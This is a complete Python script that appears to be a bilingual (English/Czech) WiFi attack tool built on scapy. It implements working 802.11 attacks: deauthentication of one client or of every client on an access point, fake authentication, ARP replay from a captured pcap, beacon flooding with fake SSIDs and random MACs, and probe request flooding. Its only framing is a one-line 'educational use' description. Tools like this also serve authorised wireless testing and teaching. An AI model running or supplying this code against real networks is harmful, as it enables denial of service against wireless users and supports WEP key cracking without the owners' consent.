#!/usr/bin/env python3
import argparse
import sys
import os
import random
import time
import threading
from scapy.all import *
from scapy.layers.dot11 import *
from scapy.layers.l2 import ARP, Ether

# Colors for terminal output
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
RESET = "\033[0m"

# Author print
def print_author():
    print(f"{CYAN}[AUTOR]{RESET} Alfi Keita")

def print_info(msg):
    print(f"{CYAN}[INFO]{RESET} {msg}")
    print(f"{CYAN}[INFO]{RESET} (CZ) {msg_czech(msg)}")

def print_warn(msg):
    print(f"{YELLOW}[VAROVÁNÍ]{RESET} {msg}")
    print(f"{YELLOW}[VAROVÁNÍ]{RESET} (CZ) {msg_czech(msg)}")

def print_error(msg):
    print(f"{RED}[CHYBA]{RESET} {msg}")
    print(f"{RED}[CHYBA]{RESET} (CZ) {msg_czech(msg)}")

def print_good(msg):
    print(f"{GREEN}[OK]{RESET} {msg}")
    print(f"{GREEN}[OK]{RESET} (CZ) {msg_czech(msg)}")

def msg_czech(msg):
    translations = {
        "Starting Deauth attack on AP": "Spouštím Deauth útok na AP",
        "Client": "Klient",
        "Interface": "Rozhraní",
        "Captured ACK frame from": "Zachycen ACK rámec od",
        "Sent": "Odesláno",
        "deauth packets": "deauth paketů",
        "Deauth attack interrupted by user": "Deauth útok přerušen uživatelem",
        "Deauth attack finished, total packets sent": "Deauth útok dokončen, celkem odesláno paketů",
        "Starting Fake Auth attack on AP": "Spouštím Fake Auth útok na AP",
        "from": "z",
        "Fake Auth attack interrupted by user": "Fake Auth útok přerušen uživatelem",
        "Fake Auth attack finished, total packets sent": "Fake Auth útok dokončen, celkem odesláno paketů",
        "Starting ARP Replay attack with packet from": "Spouštím ARP Replay útok s paketem z",
        "Your MAC": "Vaše MAC",
        "Failed to read pcap file": "Nepodařilo se načíst pcap soubor",
        "No ARP request packet found in the pcap file!": "V pcap souboru nebyl nalezen ARP request paket!",
        "Using following ARP request packet for replay:": "Používám následující ARP request paket k přehrání:",
        "Sent ARP replay packet": "Odeslán ARP replay paket",
        "ARP Replay attack interrupted by user": "ARP Replay útok přerušen uživatelem",
        "Starting Beacon Flood on interface": "Spouštím Beacon Flood na rozhraní",
        "using SSIDs from": "používám SSID ze souboru",
        "Failed to open SSID file": "Nepodařilo se otevřít SSID soubor",
        "Sent": "Odesláno",
        "beacon frames": "beacon rámců",
        "Beacon flood interrupted by user": "Beacon flood přerušen uživatelem",
        "Beacon flood finished, total packets sent": "Beacon flood dokončen, celkem odesláno rámců",
        "Starting Probe Request Flood on interface": "Spouštím Probe Request Flood na rozhraní",
        "probe requests": "probe požadavků",
        "Probe Request flood interrupted by user": "Probe Request flood přerušen uživatelem",
        "Probe Request flood finished, total packets sent": "Probe Request flood dokončen, celkem odesláno požadavků",
        "Can't open interface": "Nelze otevřít rozhraní",
        "Failed to create deauth packet": "Nepodařilo se vytvořit deauth paket",
        "Failed starting sniffer thread": "Nepodařilo se spustit sniffer thread",
        "Error sending packet": "Chyba při odesílání paketu",
        "Failed to create fake auth packet": "Nepodařilo se vytvořit fake auth paket",
        "Error sending ARP replay packet": "Chyba při odesílání ARP replay paketu",
        "Error processing pcap packets": "Chyba při zpracování pcap paketů",
        "Error sending beacon frame": "Chyba při odesílání beacon rámce",
        "Error sending probe request": "Chyba při odesílání probe požadavku",
        "You need to run this script as root": "Musíte spustit tento skript jako root",
        "No valid attack selected": "Nebyl vybrán žádný platný útok",
        "Unexpected error in main": "Neočekávaná chyba v hlavní funkci",
        "Error parsing arguments": "Chyba při zpracování argumentů",
    }
    for en, cz in translations.items():
        if en in msg:
            return msg.replace(en, cz)
    return msg  # fallback

def check_interface(iface):
    try:
        conf.iface = iface
        get_if_hwaddr(iface)
    except Exception as e:
        print_error(f"Can't open interface: {iface} ({e})")
        sys.exit(1)

def check_root():
    if os.geteuid() != 0:
        print_error("You need to run this script as root")
        sys.exit(1)

# ================== DEAUTH ATTACK ==================
def deauth_attack(iface, ap_mac, client_mac=None, count=10):
    check_interface(iface)
    print_info(f"Starting Deauth attack on AP {ap_mac}, Client: {client_mac if client_mac else 'ALL'}, Interface: {iface}")
    try:
        dot11 = Dot11(addr1=client_mac if client_mac else "ff:ff:ff:ff:ff:ff",
                    addr2=ap_mac,
                    addr3=ap_mac)
        packet = RadioTap()/dot11/Dot11Deauth(reason=7)
    except Exception as e:
        print_error(f"Failed to create deauth packet: {e}")
        return
    sent = 0

    def sniff_ack(pkt):
        try:
            if pkt.haslayer(Dot11):
                if pkt.type == 1 and pkt.subtype == 13:
                    print_good(f"Captured ACK frame from {pkt.addr2}")
        except Exception:
            pass

    try:
        sniff_thread = threading.Thread(target=sniff, kwargs={'iface': iface, 'prn': sniff_ack, 'store': 0})
        sniff_thread.daemon = True
        sniff_thread.start()
    except Exception as e:
        print_error(f"Failed starting sniffer thread: {e}")

    try:
        while count == -1 or sent < count:
            try:
                sendp(packet, iface=iface, verbose=0)
                sent += 1
                if sent % 10 == 0:
                    print_info(f"Sent {sent} deauth packets")
                time.sleep(0.1)
            except Exception as e:
                print_error(f"Error sending packet: {e}")
                break
    except KeyboardInterrupt:
        print_warn("Deauth attack interrupted by user")
    print_good(f"Deauth attack finished, total packets sent: {sent}")

def fake_auth_attack(iface, ap_mac, your_mac, count=10):
    check_interface(iface)
    print_info(f"Starting Fake Auth attack on AP {ap_mac} from {your_mac}, Interface: {iface}")
    try:
        dot11 = Dot11(type=0, subtype=11, addr1=ap_mac, addr2=your_mac, addr3=ap_mac)
        auth = Dot11Auth(algo=0, seqnum=1, status=0)
        packet = RadioTap()/dot11/auth
    except Exception as e:
        print_error(f"Failed to create fake auth packet: {e}")
        return
    sent = 0

    try:
        while count == -1 or sent < count:
            try:
                sendp(packet, iface=iface, verbose=0)
                sent += 1
                if sent % 10 == 0:
                    print_info(f"Sent {sent} fake auth packets")
                time.sleep(0.1)
            except Exception as e:
                print_error(f"Error sending packet: {e}")
                break
    except KeyboardInterrupt:
        print_warn("Fake Auth attack interrupted by user")
    print_good(f"Fake Auth attack finished, total packets sent: {sent}")

def arp_replay_attack(iface, ap_mac, your_mac, pcap_file):
    check_interface(iface)
    print_info(f"Starting ARP Replay attack with packet from '{pcap_file}' on interface {iface}, AP: {ap_mac}, Your MAC: {your_mac}")
    try:
        packets = rdpcap(pcap_file)
    except Exception as e:
        print_error(f"Failed to read pcap file: {e}")
        return
    arp_packet = None
    try:
        for pkt in packets:
            if ARP in pkt and pkt[ARP].op == 1:
                arp_packet = pkt
                break
    except Exception as e:
        print_error(f"Error processing pcap packets: {e}")
        return
    if arp_packet is None:
        print_error("No ARP request packet found in the pcap file!")
        return

    print_info("Using following ARP request packet for replay:")
    try:
        arp_packet.show()
    except Exception:
        pass

    try:
        while True:
            try:
                sendp(arp_packet, iface=iface, verbose=0)
                print_info("Sent ARP replay packet")
                time.sleep(0.05)
            except Exception as e:
                print_error(f"Error sending ARP replay packet: {e}")
                break
    except KeyboardInterrupt:
        print_warn("ARP Replay attack interrupted by user")

def beacon_flood(iface, ssid_file):
    check_interface(iface)
    print_info(f"Starting Beacon Flood on interface {iface} using SSIDs from {ssid_file}")
    try:
        with open(ssid_file, 'r') as f:
            ssids = [line.strip() for line in f if line.strip()]
    except Exception as e:
        print_error(f"Failed to open SSID file: {e}")
        sys.exit(1)

    def random_mac():
        mac = [ 0x00, 0x16, 0x3e,
                random.randint(0x00, 0x7f),
                random.randint(0x00, 0xff),
                random.randint(0x00, 0xff) ]
        return ':'.join(map(lambda x: "%02x" % x, mac))

    sent = 0
    try:
        while True:
            for ssid in ssids:
                try:
                    dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff",
                                addr2=random_mac(), addr3=random_mac())
                    beacon = Dot11Beacon(cap="ESS+privacy")
                    essid = Dot11Elt(ID="SSID", info=ssid, len=len(ssid))
                    rsn = Dot11Elt(ID=48, info=(
                        b'\x01\x00'
                        b'\x00\x0f\xac\x04'
                        b'\x01\x00'
                        b'\x00\x0f\xac\x04'
                        b'\x01\x00'
                        b'\x00\x0f\xac\x02'
                        b'\x00\x00'))
                    packet = RadioTap()/dot11/beacon/essid/rsn
                    sendp(packet, iface=iface, verbose=0)
                    sent += 1
                    if sent % 20 == 0:
                        print_info(f"Sent {sent} beacon frames")
                    time.sleep(0.05)
                except Exception as e:
                    print_error(f"Error sending beacon frame: {e}")
    except KeyboardInterrupt:
        print_warn("Beacon flood interrupted by user")
    print_good(f"Beacon flood finished, total packets sent: {sent}")

def probe_request_flood(iface):
    check_interface(iface)
    print_info(f"Starting Probe Request Flood on interface {iface}")

    def random_mac():
        mac = [ 0x00, 0x16, 0x3e,
                random.randint(0x00, 0x7f),
                random.randint(0x00, 0xff),
                random.randint(0x00, 0xff) ]
        return ':'.join(map(lambda x: "%02x" % x, mac))

    sent = 0
    try:
        while True:
            try:
                mac = random_mac()
                dot11 = Dot11(type=0, subtype=4, addr1="ff:ff:ff:ff:ff:ff",
                            addr2=mac, addr3="ff:ff:ff:ff:ff:ff")
                essid = Dot11Elt(ID="SSID", info="", len=0)
                packet = RadioTap()/dot11/essid
                sendp(packet, iface=iface, verbose=0)
                sent += 1
                if sent % 50 == 0:
                    print_info(f"Sent {sent} probe requests")
                time.sleep(0.02)
            except Exception as e:
                print_error(f"Error sending probe request: {e}")
    except KeyboardInterrupt:
        print_warn("Probe Request flood interrupted by user")
    print_good(f"Probe Request flood finished, total packets sent: {sent}")

def parse_args():
    parser = argparse.ArgumentParser(description="Advanced WiFi attacks tool for educational use (Linux only)")

    parser.add_argument("--deauth", action='store_true', help="Perform Deauth attack")
    parser.add_argument("-n", type=int, default=10, help="Number of packets to send (-1 for infinite)")
    parser.add_argument("-a", metavar="AP_MAC", help="MAC address of target AP")
    parser.add_argument("-c", metavar="CLIENT_MAC", help="Target client MAC address (optional for deauth)")
    parser.add_argument("--fakeauth", action='store_true', help="Perform Fake Authentication attack")
    parser.add_argument("-m", metavar="YOUR_MAC", help="Your MAC address (required for fakeauth and arpreplay)")
    parser.add_argument("--arpreplay", action='store_true', help="Perform ARP Replay attack")
    parser.add_argument("-b", metavar="AP_MAC", help="MAC address of target AP (required for arpreplay)")
    parser.add_argument("-r", "--pcap", help="PCAP file with ARP request packet to replay (required for arpreplay)")
    parser.add_argument("--beacon", action='store_true', help="Perform Beacon Flood attack")
    parser.add_argument("-f", metavar="SSID_FILE", help="File containing list of SSIDs for beacon flood")
    parser.add_argument("--probe", action='store_true', help="Perform Probe Request Flood attack")
    parser.add_argument("interface", help="Wireless interface in monitor mode")

    try:
        args = parser.parse_args()
    except Exception as e:
        print_error(f"Error parsing arguments: {e}")
        sys.exit(1)

    if args.deauth:
        if not args.a:
            parser.error("Deauth attack requires -a <AP_MAC>")
    if args.fakeauth:
        if not args.a or not args.m:
            parser.error("Fakeauth requires -a <AP_MAC> and -m <Your MAC>")
    if args.arpreplay:
        if not args.b or not args.m or not args.pcap:
            parser.error("ARPreplay requires -b <AP_MAC>, -m <Your MAC>, and -r <PCAP file>")
    if args.beacon:
        if not args.f:
            parser.error("Beacon flood requires -f <SSID file>")
    if not (args.deauth or args.fakeauth or args.arpreplay or args.beacon or args.probe):
        parser.error("You must specify at least one attack mode (--deauth, --fakeauth, --arpreplay, --beacon, --probe)")

    return args

def main():
    print_author()
    check_root()
    args = parse_args()

    try:
        if args.deauth:
            deauth_attack(args.interface, args.a.lower(), args.c.lower() if args.c else None, args.n)
        elif args.fakeauth:
            fake_auth_attack(args.interface, args.a.lower(), args.m.lower(), args.n)
        elif args.arpreplay:
            arp_replay_attack(args.interface, args.b.lower(), args.m.lower(), args.pcap)
        elif args.beacon:
            beacon_flood(args.interface, args.f)
        elif args.probe:
            probe_request_flood(args.interface)
        else:
            print_error("No valid attack selected")
    except Exception as e:
        print_error(f"Unexpected error in main: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
